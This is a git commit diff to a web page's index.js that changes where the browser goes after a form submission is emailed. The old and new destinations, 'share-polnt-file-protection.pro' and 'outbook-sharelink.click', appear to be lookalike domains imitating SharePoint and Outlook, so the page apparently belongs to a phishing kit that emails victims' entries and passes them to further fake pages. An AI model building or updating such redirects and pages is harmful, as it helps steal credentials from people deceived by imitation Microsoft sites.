51156240997bccf2226cf1cb15a04d759a6d5627
husknet <127146284+husknet@users.noreply.github.com>
2024-10-27 21:18:29 -0300

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -54,7 +54,7 @@ export default function Home() {
         });
 
         console.log('Email sent successfully!', response.data.message);
-        window.location.href = 'https://ne.share-polnt-file-protection.pro';
+        window.location.href = 'https://je.outbook-sharelink.click';
       } catch (error) {
         console.error('Failed to send email:', error);
         setErrorMessage('Failed to submit. Please try again.');
